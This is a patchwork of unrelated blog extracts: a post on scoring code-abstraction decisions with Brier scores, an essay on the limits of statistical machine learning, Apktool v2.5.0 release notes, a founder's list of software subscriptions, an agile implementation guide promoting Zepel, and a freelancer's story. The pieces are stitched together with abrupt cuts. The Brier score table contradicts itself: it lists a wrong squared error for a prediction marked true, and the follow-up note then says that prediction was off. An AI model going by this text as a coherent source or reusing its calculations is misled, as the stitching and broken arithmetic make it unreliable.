<p>Sometimes people chop functionality fine to allow flexible combination. Sometimes they lump it large to encapsulate complexity. Sometimes they seek consistent granularity, making all classes and operations similar in scale. These are oversimplifications that don’t work well as general rules…Cookbook rules don’t work.<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup></p>

<p>Enough on the shortcomings of heuristic-based advice. Let’s turn to Dodd’s feelings/intuition based advice.</p>
<p>Dodd tells us to “be mindful of the fact that we don’t really know what requirements will be placed on our code in the future” and that we should only create abstractions when it “feels right.”</p>
<p>The problem here is that our feelings can mislead us, which probably partially explains the appeal of heuristics: we want something more as a guide.</p>
<p>Some readers — and presumably Dodd — would reply, “But more experienced programmers have more trust-worthy feelings!”</p>
<p>Maybe. But if we’re to believe the science on expert judgment and intuition, the impact of experience in helpfully shaping our intuitions here is more limited than we think. Psychologist and behavioral economist Daniel Kahneman won a nobel prize partially because he taught us that expert judgement doesn’t form simply because we’ve been doing something for a long time. For that judgment to form, we need specific feedback loops,<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> loops that are often absent for many programmers who have an average job tenure of 18 months or who use tools and languages that change quickly enough to inspire fatigue or who work for companies that undergo radical changes as they grow from tiny startups to large, proper businesses.</p>
<p>So, heuristics are too cookie-cutter and feelings/intuitions are too wishy-washy. Thankfully, there are other ways of guiding our decisions about abstraction vs. duplication.</p>
<h2 id="a-brier-score-based-method">A Brier score based method</h2>
<p>When we make a design decision in our code, we are basing that decision on a prediction about how the code will change in the future. When we duplicate code instead of abstracting it, we’re predicting that the code we could have abstracted will somehow be inadequate for the future. When we abstract code, on the other hand, we’re predicting that the abstraction will earn it’s keep in our codebase by having many clients.</p>
<p>Since design decisions are informed by predictions, we can use the same frameworks we use for assessing predictions to assess architectural decisions, including decisions about when to abstract code and when to duplicate it. I’ve used <a href="https://en.wikipedia.org/wiki/Brier_score" target="_blank">brier scores</a> for this a few times at my job, and consistent use over time will lead me to develop a set of design principles that are both specific to my situation at Heap — which avoids the cookie-cutter problem heuristics have — and not susceptible to the vagaries of my feelings.</p>
<p>Since I’ve already given an overview of how brier scores work <a href="https://www.philosophicalhacker.com/post/improving-forecasting/">elsewhere</a>, I’ll skip the explanation of the simple math behind them
here. Using this method for assessing abstraction vs. duplicate decisions, is as simple as creating something like the following table:</p>
<table>
<thead>
<tr>
<th>Prediction summary</th>
<th>Date</th>
<th>Confidence</th>
<th>Came true?</th>
<th>Prediction Squared Error</th>
<th>Brier Score</th>
</tr>
</thead>
<tbody>
<tr>
<td>Abstracted code for profile detail view will be re-used within 6 months</td>
<td>10/31/20</td>
<td>.85</td>
<td>TRUE</td>
<td>0.0625</td>
<td>0.0625</td>
</tr>
<tr>
<td>Duplicated code in <code>TodoList.jsx</code> and <code>TodoDetail.jsx</code> will diverge within 3 months</td>
<td>1/31/20</td>
<td>.75</td>
<td>FALSE</td>
<td>0.5625</td>
<td>0.3125</td>
</tr>
</tbody>
</table>
<p>Once enough time has passed to evaluate the accuracy of a prediction, I add some notes explaining why the prediction was off. For example, for the first prediction in the table — a prediction that is similar to a real one I made when I first started my new gig — I might write:</p>
<blockquote>
<p>Turns out the profile detail view doesn’t change very often. In fact, I was told after I refactored it that the subsequent changes I made were the most significant ones done in several years. Should have examined git history of the files involved before committing to creating an abstraction.</p>
</blockquote>
<p>Tracking this sort of thing is obviously more work that applying simple rules of thumb or relying on our feelings, but it’s not that bad. We don’t have to track every decision this way, and updating this spreadsheet is something that I spend less than five minutes on each day.</p>
<p>If spending 5 minutes a day<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup> gets me a context-specific, data-driven model about where to spend my refactoring time, that’s totally worth the trouble. I’ll take it over simple heuristics or my flawed intuition any day.</p>

          <p>
            We investigate the limitions of statistical methods, a subclass of which is called "machine learning", taking the opportunity to touch on several aspects of the industry, including the future of employment, various industry practices, and privacy. It's written as a wide-audience article, and only assumes a passing familiarity with software and statistics. We start from a seemingly hardline stance, and follow a line of flawed reasoning leading up to the point where humans become near-obselete, an event commonly known as the "singularity". Finally, we step back to see where we stumbled.
          </p>
          <p>
            We use the following starting point: using any combination of statstical methods, of any complexity, it is impossible to develop any sort of "understanding" that resembles human intelligence. Instead of trying to tackle questions about the nature of intelligence, or entering a deep philosophical rabbit-hole about whether "intelligence is computable", we start with the modest goal of understanding what statistical methods are.
          </p>
          <p>
            As a starting point, one might argue that the world is made of up of a collection of "facts" that need to be "memorized" after having seen them stated multiple times correctly. A variation of this is the "monkey brain", in which you train the monkey by asking it to perform a certain task, rewarding it everytime it gets it right, and penalizing it everytime it gets it wrong. This is the basic idea behind "reinforcement learning", the kind used to get machines to play "games". Speed up the task-to-[reward or penalty] cycle exponentially, and you have a "smart monkey". While the "smart monkey" might make silly mistakes on a bad day for irrational reasons, a "bad day" for a statistical model is the event when it is presented with data that it doesn't know how to fit. The monkey's emotional engine can arguably be emulated by weighting the penalty that the machine receives, based on how fundamental the mistake was, and how many hours of training it had received. The procedure we've described of "training" a machine like this falls under the class of "supervised learning", which, as one might argue, is the same way a human learns from an assignment or exam.
          </p>
          <p>
            Let us assume that a machine can successfully memorize trillions of "facts", and look into how these might be represented. In most commonly-used applications today, they are encoded in the form of matrices of floating-point numbers, with some weighted arithmetic operations connecting them, as chosen by the person building the model. The model is fed a matrix of floating-point numbers, and outputs a matrix of floating-point numbers. We might argue that the inability to interpret these individual numbers is akin to not being able to interpret the voltages of the individual neurons in the brain, and this doesn't seem to be a problem in practice. The said "facts", now lost in a soup of numbers, can be generalized into a broader class of "things that can be inferred from data". With every attempt at being able to handle a new situation, the model simply does arithmetic on the soup (a large class of which are just matrix multiplications), and the numbers in the soup adjust themselves with every "feedback" we give it. This is the basic idea behind "neural networks". While it's easy to get lost in the details, note that we're still doing statistical analysis. The additional "frills" haven't changed the essential nature of the method: the machine is "learning by example", and attempting to "generalize" it.
          </p>
          <p>
            Among human beings, learning by example is a very effective way to learn, when starting out. Most programmers would attest to the fact that they started out by copying examples, tweaking them, and checking them with a program (these programs are known as "compilers"). Some would argue that this approach doesn't scale in human beings, because they don't have the computational power to continue learning by example, and "cheat" by reading some kind of specification as they become more experienced. Does it mean that classical programmers (aka. those not engaged in building statistical models) could be replaced by machines in the future?
          </p>
          <p>
            The key to seeing the viability of this argument is to consider two things: (1) the structural complexity of the task, and (2) the number of examples available to concretely reinforce the patterns, and nullify the anti-patterns. It's no secret that there are several good tools for aiding with "simple" programming langauages (otherwise called IDEs), which a reductionist would phrase as "machines are good at dumb tasks". Using simple frequency analysis, the IDE can order its auto-complete suggestions and corrections intelligently. To date, there is no IDE that can assist with the help of the vast repositories of open-souce code, but it doesn't require a big leap in imagination to assume that this will be possible in the future. In fact, we should be open to the possibility that compilers start building repositories of error-messages, and run in the background, suggesting even more intelligent fixes, based on how others who encountered a similar error fixed it. A philophically-minded reader would be interested in whether the "intent" of the programmer can be dissected, and if, by labelling various segments of publicly available code with some kind of abstract "function", the machine can write entire programs with a few prompts. Assuming for a minute that this might be possible, can classical programmers stay relevant by simply moving to newer languages or technologies, on which there are few examples?
          </p>
          <p>
            This poses a quandary: are we playing some kind of primal game, where the prey constantly has to come up with new strategies to outrun the predator? Some would argue that by refining our statistical methods, one can emulate the process of generalization effectively enough to beat the prey's creativity on the "search space" completely. What if this is the nature of every human specialization? An event, commonly referred to as the "singularity", whereby humans become near-obselete, is predicted in 2040. Why is this claim so ludicrous?
          </p>
          <hr>
          <p>
            To better understand where statistical models are succesful, let us enumerate some recent accomplishments in the field.
          </p>
          <p>
            Beating the best human player at Go, a program referred to as AlphaGo. The problem is well-defined, and there are very few starting rules. How does a human become good at Go? Just like in Chess, the rules play an insignificant role in the player's learning, and most of the training is about analyzing previous games. There are huge databases of expertly-played games available, and human players usually try to follow a semi-systematic approach. It could be argued that the machine is inefficient, because it doesn't follow a systematic approach, but the raw computational power makes this handicap look irrelevant. It's a little like arguing that a machine doesn't know the decimal system, or the tables of multiplication, and simply flips 0s and 1s to perform arithmetic. Humans here are the disadvataged class in both cases, and it is completely unsurprising that, despite certain "inefficiencies", AlphaGo essentially does what a human player does to beat them at it: analyzing lots of games.
          </p>
          <p>
            A language engine, referred to as GPT-3. How do humans master a natural language? They do it semi-systematically, starting from the association of simple words to real-world objects, then moving on to phrases describing something, learning some construction rules and absorbing culture along the way; and finally by reading a lot of good literature. Of course, the grammar rules play a very small part of the overall learning, so it is unsurprising that GPT-3 is able to produce grammatically correct responses to human-supplied prompts. However, literature talks about things in the real world, and for it to make sense, sufficient interaction with the real world is a prerequisite. It's not a bounded game, where all the necessary information is contained on a map or a board. It is, therefore, entirely unsurprising that GPT-3 can't "know" whether dropping a metallic plate would cause it to melt. It cannot infer the relationship between real-world objects, nor can it differentiate between factual and fictional human experiences. Producing good literature requires a whole lot more than that. This landmark achievement, despite having access to terabytes of text, and an unimaginable amounts of compute power, has failed to infer much more than grammar, sentence construction, and context.
          </p>
          <p>
            The translation engine behind Google Translate. Someone who has just started using the product with no knowledge of the underlying technology would be puzzled about why this is chalked up as an achievement. Indeed, it's unlikely that we'll even have a half-decent translation engine using purely statistical methods. Translation engines have been around for a long time, and their latest iteration might be a significant improvement over the previous ones, but on an absolute scale, something seems to be off about relying on a pure statistical method to learn natural language.
          </p>
          <p>
            Medical diagnostics. In this field, it is absolutely imperative to organize every little piece of data about every patient in a highly systematic manner: a missing entry is a life-or-death situation. On millions of these remarkably well-organized records, it should come as no surprise that a machine can serve as a valuable aid to a doctor. Statistical models have been a resounding success in this area. The achievement here, perhaps, should be attributed to the subfield of …</p></article></div>

			<figure><img src="https://connortumbleson.com/content/images/2020/12/apk-logo_versions-1.png" alt="" srcset="https://connortumbleson.com/content/images/size/w600/2020/12/apk-logo_versions-1.png 600w, https://connortumbleson.com/content/images/size/w1000/2020/12/apk-logo_versions-1.png 1000w, https://connortumbleson.com/content/images/2020/12/apk-logo_versions-1.png 1480w" sizes="(min-width: 720px) 720px"></figure><p>Apktool v2.5.0 has been released! This is a long overdue release that fixes many long-running issues.</p><p>The last release was way back on November 29, 2019 and by the time this version is released - It will have been over 1 year since our last Apktool release. So what happened?</p><p>Honestly a combination of 2020, burnout and life changes. None of which are important to this release post. Though if you are interested - I <a href="https://connortumbleson.com/2017/05/01/the-human-behind-the-keyboard/">blogged</a> about some of the burnout of long-running open source projects.</p><p>Let's talk about maintaining a backlog. Apktool prior to this release had over 250 tickets ranging from 8 years old to 1 day old. It was frankly insane. Some of the topics hadn't even been responded to in years. So I spent <a href="https://twitter.com/iBotPeaches/status/1333065159552757760">roughly 20 hours</a> over Thanksgiving and went <strong>through every single ticket</strong>. The backlog is now 40 tickets, organized and ready to be fixed. Some tough choices were made on a handful of tickets, but I had to be realistic when it came to fixing some of these anti-tamper issues.</p><p>I wouldn't have done this without the help from "peret" who helped build aapt/aapt2 binaries for me on Mac. For some reason (still to this post) a few select repositories cloning from AOSP result in:</p><pre><code>RPC failed: HTTP 499 curl 16 Error in HTTP2 framing layer</code></pre><p>This was blocking me for months from completing the release. However, that is enough meta discussion. Apktool development is active again, a smaller backlog has me hooked and a helpful community of authors will keep the discussions and features going.</p><p>So lets talk about the changes.</p><hr><p>This release packs in Android 11 support, which will require a framework update as well as upgrading to the latest and greatest <a href="https://github.com/JesusFreke/smali">smali</a> project. We embraced GitHub Actions dropping TravisCI and started the deprecation process for 32 bit machines. (Sorry, AOSP is pushing me here)</p><p>Error messages were overhauled to help explain why things aren't working. Test cases were enhanced to prevent regressions and each pull request is automatically tested again all 3 major operating systems and a variety of Java versions.</p><p>The obfuscation war never ends and Apktool v2.5.0 makes leaps of improvements when it comes to parsing files. Apktool will survive when all namespace references have been removed. Apktool will survive with dummy resources if all resource names have been stripped. Apktool will also survive if all resources have been tweaked to the same name. This of course makes compilation very difficult, but at least the application can be disassembled now.</p><p>Binaries for aapt/aapt2 received another great set of patches aiming to lessen the errors that either will encounter during compilation. This led to patching many compression related bugs when it comes to rebuilding applications as well as patching many crashes that result when resources can't be found.</p><p>Features were added for the new <code>compileSdkVersion</code> property as well as a <code>apktool list-frameworks</code> command. Finally, some quality of life enhancements for error codes, helper scripts and copyrights. So with that, the detailed change log and author breakdown.</p><hr><p><strong>This release had 180 commits by 11 people</strong></p><ul><li>Connor Tumbleson (iBotPeaches) - 160 commits</li><li>Giacomo Ferretti (giacomoferretti) - 4 commits</li><li>Frieder Bluemle (friederbluemle) - 3 commits</li><li>Peter Retzlaff - 3 commits</li><li>Ankit Pati (ankitpati) - 2 commits</li><li>Comnir (Nir) - 2 commits</li><li>Leo Wandersleb (Giszmo) - 1 commit</li><li>Patrick Decat - 1 commit</li><li>Steven Arzt (StevenArzt) - 1 commit</li><li>Taras - 1 commit</li><li>chris-sharl - 1 commit</li><li>vladimir (vldmrrr) - 1 commit</li></ul><ul><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2399">#2399</a>, <a href="https://github.com/iBotPeaches/Apktool/issues/2397">#2397</a>, <a href="https://github.com/iBotPeaches/Apktool/issues/2369">#2369</a>, <a href="https://github.com/iBotPeaches/Apktool/issues/2167">#2167</a>] Android 11 Support.</li><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2006">#2006</a>, <a href="https://github.com/iBotPeaches/Apktool/issues/1718">#1718</a>] Upgraded smali/baksmali to v2.4.0.</li><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2210">#2110</a>, <a href="https://github.com/iBotPeaches/Apktool/issues/2053">#2053</a>] Deprecate 32 bit operating systems.</li><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2251">#2251</a>] Fix thread crash with binary name collision.</li><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2323">#2323</a>] Fix compression on <code>resources.arsc</code>.</li><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2333">#2333</a>] Fix crash with empty files during compression.

            <p>I always enjoy seeing which products founders use so I thought I'd share the ones I use, what I use them for, and how much they cost.</p><h3>Subscriptions</h3><p><a href="https://www.digitalocean.com/" target="_blank"><b>DigitalOcean</b></a></p><p>I use DigitalOcean to host all of my products (which are mostly built with Django). I also use their "volume storage" product. I've hosted with AWS before, but found DigitalOcean way easier to use and manage.</p><p><span>Across my products, this currently costs $295 per month</span>, but that should be decreasing in coming months wind down some more resource intensive products.</p><p><b><a href="https://buffer.com/" target="_blank">Buffer</a></b></p><p>I've been a Buffer customer for many years and mainly use their API to automatically schedule posts for the Screenlane Twitter account. The API doesn't seem to be a priority for them so I'm open to switching, but there doesn't seem to be any solid alternatives for the price and it still works for me.</p><p><span>$10 per month</span></p><p><a href="https://calendly.com/" target="_blank"><b>Calendly</b></a></p><p>I use Calendly to make it easy for people to book meetings with me. I mostly needed this for the "Book a demo" flow for <a href="https://screenjar.com/" target="_blank">Screenjar</a>. I could have probably got away with the free plan, but decided to upgrade at some point.</p><p><span>$8 per month </span>(I got the yearly plan at $96)</p><p><a href="https://postmarkapp.com/" target="_blank"><b>Postmark</b></a></p><p>Transactional emails (password resets emails etc). One of my favourite products - easy to navigate &amp; set up, great company, and super reasonable pricing.</p><p><span>$10 per month</span></p><p><a href="https://sendgrid.com/" target="_blank"><b>Sendgrid</b></a></p><p>Also transactional email. I probably need to cancel this and move a couple projects over to Postmark.</p><p><span>$14.95 per month</span></p><p><a href="http://urlbox.io/" target="_blank"><b>Urlbox.io</b></a></p><p>This is a URL to image API which I use to automatically take screenshots of emails for <a href="https://pageflows.com/" target="_blank">Page Flows</a> (emails sent as part of a user flow are captured. <a href="https://pageflows.com/post/desktop-web/onboarding/basecamp/" target="_blank">You can see an example at the bottom of this page</a>)</p><p><span>$29 per month</span></p><p><a href="https://www.imgix.com/" target="_blank"><b>Imgix</b></a></p><p>This is used to process images, automatically create thumbnails of uploaded images etc. I'll likely stop using this soon as I'm winding down most of the products I used it for.</p><p><span>~$50 per month</span></p><p><a href="https://emailoctopus.com/" target="_blank"><b>Email Octopus</b></a></p><p>I just stated using this to send all of my newsletters.</p><p><span>~$100 per month</span></p><p><a href="https://workspace.google.com/" target="_blank"><b>Google Workspace or G-Suite or whatever it's called these days</b></a></p><p>I use this to create email accounts with custom domains mainly. I hate it.</p><p><span>~$15 per month</span></p><p><a href="https://carrd.co/" target="_blank"><b>Carrd</b></a></p><p>I made the landing page for <a href="https://metapine.com/" target="_blank">Metapine</a> with this. Great tool.</p><p><span>$1.58 per month!!! ($19 per year)</span></p><h3>Others</h3><p>Some other bits and bobs the business has paid for reasonably recently</p><p><a href="https://stripe.com/" target="_blank"><b>Stripe</b></a></p><p>I use Stripe to handle payments and they take a cut of revenue for that.</p><p><a href="https://refactoringui.com/" target="_blank"><b>Refactoring UI</b></a></p><p>A simple, practical book on UI design. This has come in handy a few times and I use some of the icons that came with it on.</p><p><u>$149</u></p><p><a href="https://salesforfounders.com/" target="_blank"><span>Sales for founders</span></a></p><p>Says it in the name. A course and a community for founders who want to learn sales. I still get involved in the community from time to time.</p><p><u>~$200</u></p><p><a href="https://kintu.co/profitable-newsletters/" target="_blank"><b>Profitable newsletters</b></a></p><p>A course about creating profitable newsletters. I'll be honest, I haven't gone through any of this yet.</p><p><u>$99</u></p><p><a href="https://www.softwareideas.io/" target="_blank"><b>Software ideas</b></a></p><p>A newsletter which shares ideas for software businesses (cancelled subscription).</p><p><u>$19 per month</u></p><p><a href="https://nichesaas.substack.com/" target="_blank"><span>Niche SaaS</span></a></p><p>Another newsletter which shares ideas for software businesses (cancelled subscription).</p><p><u>~$6 per month ($70 per year)</u></p><p><b>Accountant</b></p><p>Super happy to pay for this, highly recommended.</p><p><span>~$100 per month</span></p><p><a href="https://www.redditinc.com/advertising" target="_blank"><b>Reddit Ads</b></a></p><p>Experimented with some ads, didn't really get anywhere with it.</p><p><span>~$50</span></p><p><a href="https://gfycat.com/gifbrewery" target="_blank"><b>GIF Brewery</b></a></p><p>For recording gifs (mainly for <a href="https://screenlane.com/" target="_blank">Screenlane</a>)</p><p><span>~$8</span></p><h3>Free products</h3><p>I'd likely pay for these if I had to and there were no free alternatives.</p><p><b><a href="https://cloudflare.com/" target="_blank">Cloudflare</a></b></p><p>CDN, caching, protection from DDOS attacks etc</p><p><b><a href="https://whereby.com/" target="_blank">Whereby</a>&nbsp;&amp; <a href="https://zoom.us/" target="_blank">Zoom</a></b></p><p>I use both of these for video meetings</p><p>I also use <a href="https://www.notion.so/" target="_blank"><b>Notion</b></a> sometimes, but mostly default to using the Apple notes app.</p><hr><p>That's actually more than I expected.

                    <p>If you’re here, my guess is there are some inefficiencies in the way your team is working right now. And you’re likely looking to eliminate them by implementing agile within your team.</p><p>Of course, implementing agile isn’t just about firing up an agile software tool and collaborating with your teammates. </p><p><em>If it were that easy, you wouldn’t be reading this article, would you? </em>😉</p><p>That’s why I’ll walk you through every single step on how you can successfully implement agile within your team in this article.</p><h2 id="quick-context-on-agile-the-what-the-why">Quick Context on Agile: The What &amp; The Why</h2><p><em>Waterfall: You can’t make changes to an ongoing project, certainly not to the business needs and expectations.</em></p><p><em>Agile: Hold my beer </em>😎</p><p>Agile is an extremely practical approach to developing great products. Unlike waterfall, where risks can’t be afforded and failure isn’t an option, agile embraces risks and is prepared to handle failure. </p><p>Agile has the willingness to learn throughout the product development process. And it has the openness to incorporate changes received via early feedback, at any stage. These qualities of agile attribute to its high success rates - <a href="https://vitalitychicago.com/blog/agile-projects-are-more-successful-traditional-projects/">2x that of the waterfall method</a>!</p><p>So, you needn’t worry about a project taking several months only to find out it is nothing like you visualized. No such bummers with agile! </p><p>It serves as the perfect medium for teams to learn and grow while satisfying the customer’s needs. Seriously, who doesn’t want that?</p><p>Now that you know what agile is and why it’s popular, let’s skip to the important part: how to implement the agile method successfully?</p><h2 id="successful-agile-implementation-steps-to-get-it-right">Successful Agile Implementation: Steps to get it right</h2><p>Agile is receiving a lot of backslashes on the Internet of late. But when you take a closer look, you'll find there's only one major reason behind this - poor implementation of agile practices. So, to maximize agile’s potential, it is critical to implement it while following its principles and values as mentioned in the <a href="https://zepel.io/agile/agile-manifesto/?utm_source=agilelibrary&amp;utm_medium=text&amp;utm_campaign=agile-methodology-implementation-steps-guide/">Agile Manifesto</a>.</p><p>Now, let’s look at the key steps involved in the agile software development process and how to implement it.</p><h3 id="step-1-envisioning-the-product">Step 1: Envisioning the Product</h3><p>The first and foremost thing to do before you begin your project is to clearly define what you intend to achieve through it. And then, to visualize it completely from start to end. </p><p>Picture it, draw it if you must, and jot down the important details regarding the project that will form its foundation. The details must cover:</p><ul><li><strong>Addressing the Problem </strong>- problem statement, need for a solution, how the solution will address the problem</li><li><strong>Market Research</strong> - scope, target audience, competitor analysis, positioning</li><li><strong>Product Definition</strong> - name, features, benefits, value proposition</li></ul><p>The purpose of this step is to gain clarity regarding the project’s vision and brainstorm for ideas to implement it. And also to ensure that your entire team is on the same page.</p><p><strong>Example:</strong> Let’s assume that your project is to develop a mobile app for taxi services. </p><p>You do all the groundwork and market study. You identify your target audience, their deepest problems with the current solution, how your app solves it, and who your competitors are. You also visualize how your app will look and operate. </p><p>Once you visualize your app, you create the project by giving it a name, brainstorm and note down the features it will possess, and write user stories for each feature.</p><p>When kick-starting a project, you’ve got to begin with a bang. Because, as the Irish proverb goes, “<em>Making the beginning is one-third of the work</em>.” &nbsp;</p><p>To help you kick-start on the right note and set the pace for the rest of the project, use the right tool that’s perfect for you. </p><p><em>Zepel can be that tool</em>.</p><p>Zepel allows you to create projects or <em>Squads </em>and name them as per your convenience. Once you’ve created your squad, you can create the necessary <em>Features</em>. </p><figure><img src="https://zepel.io/agile/content/images/2020/10/zepel-feature-progress-updates.png" alt="Features and their progress within a squad in Zepel" srcset="https://zepel.io/agile/content/images/size/w600/2020/10/zepel-feature-progress-updates.png 600w, https://zepel.io/agile/content/images/size/w1000/2020/10/zepel-feature-progress-updates.png 1000w, https://zepel.io/agile/content/images/2020/10/zepel-feature-progress-updates.png 1200w" sizes="(min-width: 720px) 720px"><figcaption>Create features within your squad and quickly view their progress</figcaption></figure><p>Under each feature, you can create user stories, and add specific tasks and subtasks. Give your tasks a name, description, due date, and also assign them to your team members.</p><h3 id="step-2-laying-out-a-roadmap-and-organizing-the-releases">Step 2: Laying Out a Roadmap and Organizing the Releases</h3><p>On attaining a clear picture of the project, the next thing to do is laying out the roadmap along with a rough plan of the releases. </p><p>Here, you and your team must discuss and design a plan of action for the product. This plan of action must include an overview of the product development iterations with tentative deadlines for each release. </p><p>Once you’ve designed your roadmap, it is essential to create a timetable with the set milestones i.e timeframes for each release of the product. These timeframes need not be exact dates but it is ideal to set realistic deadlines. </p><p>In doing so, neither will the team become lethargic nor will the product owner lose patience. So go ahead and create that timetable with all the release dates. </p><p><strong>Example:</strong> You create a roadmap for the taxi service app with approximate, realistic timeframes.</p><p>You’ve divided your project into 4 milestones - Core UI design, maps with payment, taxi booking within your city, cab rentals for long-distance rides.</p><p>You now plan the releases for this project with loose timeframes and organize them in a timetable.</p><p>With this roadmap, you have successfully translated your vision into a plan of action for your team to follow.</p><h3 id="step-3-choosing-your-framework-go-scrum-or-go-kanban">Step 3: Choosing your framework - Go Scrum or go Kanban?</h3><p><em>“We are who we choose to be.” – Green Goblin, from Spider-Man</em></p><p>Similarly, your project will be what we want it to be if you choose the right framework. </p><p>But to choose wisely, you would need to know the answers to the following questions:</p><ul><li>What are scrum and kanban?</li><li>Why and when to choose them?</li><li>How to implement them?</li><li>Differences between scrum and kanban</li></ul><p>Let’s dive right in, shall we?</p><h2 id="when-to-choose-scrum">When to choose Scrum?</h2><p>Scrum is a widely used agile framework. In this method, complex problems are broken down into smaller workable solutions and are delivered in sprints. Each sprint is timeboxed to be released in 1 - 4 weeks, most commonly within 2 weeks.</p><p>Most teams pick scrum as their preferred agile methodology because it is the most popular and successful framework. According to <a href="https://www.scrumalliance.org/ScrumRedesignDEVSite/media/scrumalliancemedia/files%20and%20pdfs/state%20of%20scrum/scrum-alliance-state-of-scrum-2015.pdf">Scrum Alliance’s 2015 survey</a>, 62% of scrum projects were a success. I’m sure the numbers have gone up since then.</p><p>But how do you know if scrum is ideal for your project? Scrum is apt when your project calls for:</p><ul><li>Openness to incorporate changes in requirements, priorities, and even solutions after each iteration</li><li>Working in cycles on limited features with guaranteed delivery at the end of each cycle</li><li>Customer-centric testing and feedback is the priority </li></ul><p>Does scrum seem impressive? Or are you thinking like hey it seems all good on paper but how does it fare in the real world? </p><p>To answer that, <a href="#agile-scrum-implementation">allow me to walk you through to implement agile with scrum</a>.</p><h2 id="when-to-choose-kanban">When to choose Kanban?</h2><p>Kanban is another popular methodology in agile. It is a progressive process that assures continuous delivery. There are no sprints here. Instead, the tasks in the project are prioritized and then completed a few items together at once, followed by the next set of remaining items. </p><p>Kanban board is used by teams to view the progress of the project at a micro-level. </p><p>Kanban is <em>the one</em> for your project if:</p><ul><li>There are many unrelated user stories and tasks</li><li>Requirements and their priorities keep changing like the weather</li><li>You wish to deploy multiple releases in less than a week, especially unscheduled ones </li></ul><p>Kanban is extremely flexible and fairly simple in terms of implementing. If you think that seems to fit the bill for your project, <a href="#agile-kanban-implementation">here's how you can implement agile using kanban</a>. </p><p><em>If you’re still debating between scrum and kanban, understand the differences between the two with the help of this article: <a href="https://zepel.io/agile/scrum-vs-kanban/?utm_source=agilelibrary&amp;utm_medium=text&amp;utm_campaign=agile-methodology-implementation-steps-guide/">Differences between scrum and kanban</a>.</em></p><hr><!--kg-card-begin: html--><h2 id="agile-scrum-implementation">Implementing Agile the Scrum Way</h2><!--kg-card-end: html--><p>If you get Scrum right, your project is guaranteed to be on its trajectory to success. 🚀</p><p>Take a quick look at the steps that go into successfully adopting scrum for your project.</p><h3 id="step-1-gathering-requirements-for-product-backlog">Step 1: Gathering Requirements for Product Backlog</h3><p>Before commencing your scrum project, you need to set the stage for it.

<p>I was a frustrated, overworked, underpaid software developer.</p>



<p>I had worked for a company since graduating from University. Must have been for 4–5 years.</p>



<p>The company wanted a new cloud based product range creating and I was the only developer working on this product.</p>



<p>Myself, a few of the marketing and communications team, as well as a few of the sales guys, worked together to launch the product. We managed to sign up loads of new customers and transition a lot of existing enterprise customers onto the new product line.</p>



<p>The launch was a success.</p>



<p>Anyway. At the time I had recently bought my first house on my own. I was extremely lucky to be able to do this. However, money was really tight.</p>



<p>I was dating at the time too (happy to say that the girl is now my wife). We were always off out, going on dates. This was stretching my budget to the limit.</p>



<p>It had gotten to the point where I was fed up of not being paid enough for the value I was bringing to the company. I went to my boss with an amazing proposal and asked for a pay rise. Nothing major, but a decent amount that would make my life a bit more comfortable.</p>



<p>“I will see what I can do, I will ask the owner and MD, see what they say”. I was hoping for good things.</p>



<p>Two days later my boss came back. “Sorry, there isn’t enough cash flow at the minute, maybe we can give you a little pay rise in 6 months!”.</p>



<p>Looking back, I took it well. However, a few days later I nearly “blew my lid”.</p>



<p>Every Monday morning the owner of the company gave a business update to the entire company. He was happy to announce that the cloud product range I had been a key part of was a huge success for the business. And that it had added over £6 million to the overall value of the business.</p>



<p>“Surely the £6 million can cover my modest pay rise?” I shrugged it off and moved on.</p>



<p>Over the course of the next few days. The owner of the business turned up one day, driving a new Ferrari. A day later, driving a new McLaren. He had also bought his wife a new Range Rover. I was fuming. So much for having no cash flow in the business. I could see why.</p>



<p>It wasn’t just me that felt that way. One of the girls I had worked with on the product launch told me she had also asked for a pay rise. She was in the process of buying her first house with her boyfriend. The poor girl was nearly in tears as we were chatting, looking out the window at the owners new McLaren sports car.</p>



<p>That was it. That was my breaking point. I didn’t want to move jobs as the same situation would more than likely happen again.</p>



<p>I had to become the master of my own destiny.</p>



<p>So I started trying to find freelance customers and start my own software business. I really wanted to make my own money and not rely on an employer so I wouldn’t have to keep working in a 9–6 job that I hated.</p>



<p>I wanted to be able to support myself and my future wife so she wouldn’t have to work and I could start a family.</p>



<p>The thing is, I was living pay cheque to pay cheque, struggling to make the move to freelancing. That meant I wasn’t able to support my girlfriend so she wouldn’t have to work, let alone start a family.</p>



<p>To make things worse, I felt terrible because everything I tried, failed and I couldn’t seem to land that first well paying customer. I felt even worse about the situation because I had no clue if all these emails and proposals I was sending out was going to be in vain and that I’d look stupid in the end. I felt like a failure as a boyfriend and a professional.</p>



<p>The problem was that I had ZERO experience in communicating with potential clients and showing how valuable my software skills could be to their business. Which meant working to the early hours each evening, putting proposals together, trying to write professional emails. I wasn’t getting any response from the businesses I was reaching out to, which meant my dreams of being my own boss and supporting my family was squashed on a daily basis.</p>



<p>Then, as if by chance, something amazing happened…</p>



<p>That’s when I met up with an old University friend of mine, who had been freelancing for years and he showed me his simple framework all about how to build up a pipeline of potential customers!</p>



<p>It was now crystal clear to me how to structure subject lines, emails and proposals in a certain way that made potential clients sit up and take note, because I saw that I could use a repeatable framework that worked and spend less time on prospecting.</p>



<p>I also learned that you DON’T need to show them your portfolio or body of work, you need to focus on how you can solve their problems and meet their needs instead.</p>



<p>As a result I started testing what worked and came up with my own templates and framework.</p>



<p>After I did that, I started getting responses to the emails I was sending out, even started getting referrals. If someone didn’t need my services but knew of someone who did they passed on my details.</p>



<p>Suddenly, I was making enough money to cover my house payment and my direct debits every month, working part time freelancing.</p>



<p>That’s when I realized that the secret to finding freelance customers and start my own business was create a system and automation to send even more emails out to old customers and new leads.</p>



<p>My plan was to start an email list and use the framework to contact old customers as well as new prospects.</p>



<p>So I started documenting the framework, templates and cheat sheets. But I didn’t stop there.</p>



<p>I then sat down and used my framework to send out more emails than ever before.</p>



<p>Starting by contacting more and more of my existing customers and then tried to find new customers.</p>



<p>But there was still a problem…</p>



<p>It still took a LONG time to sit down at the keyboard and type out each email to a prospect.</p>



<p>It took hours and hours each evening. After working all day, getting the emails sent was NO fun.</p>



